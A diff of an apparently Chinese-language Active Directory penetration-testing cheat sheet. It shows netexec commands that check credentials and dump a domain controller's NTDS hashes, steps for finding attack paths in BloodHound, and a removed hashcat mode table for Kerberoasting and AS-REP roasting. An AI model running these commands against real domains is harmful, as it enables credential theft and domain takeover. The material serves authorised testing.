@@ -8,9 +8,6 @@
    ```
 
 
-|------|------|---------|------|
-
-
 ```bash
 # 1. 验证凭据
 nxc smb 10.0.0.1 -u user -p 'Pass123' -d domain.local
@@ -49,14 +46,3 @@ nxc smb dc.domain.local -u svc -p 'CrackedPass' --ntds
 5. 边等边过 BloodHound 查 Tier 0 / Pre-built attack paths
 6. 破出密码 → 标记 Owned → 重新查路径
 ```
-
-
-|------|------|
-| 13100 | Kerberos TGS-Rep (Kerberoasting) |
-| 18200 | Kerberos AS-Rep (AS-REP Roasting) |
-| 5500  | NetNTLMv1 |
-| 19600 | Kerberos TGS-Rep (AES128) |
-| 19700 | Kerberos TGS-Rep (AES256) |
-
-
-- Kali 2026.x，impacket 0.12+, netexec 1.x, hashcat 6.2+
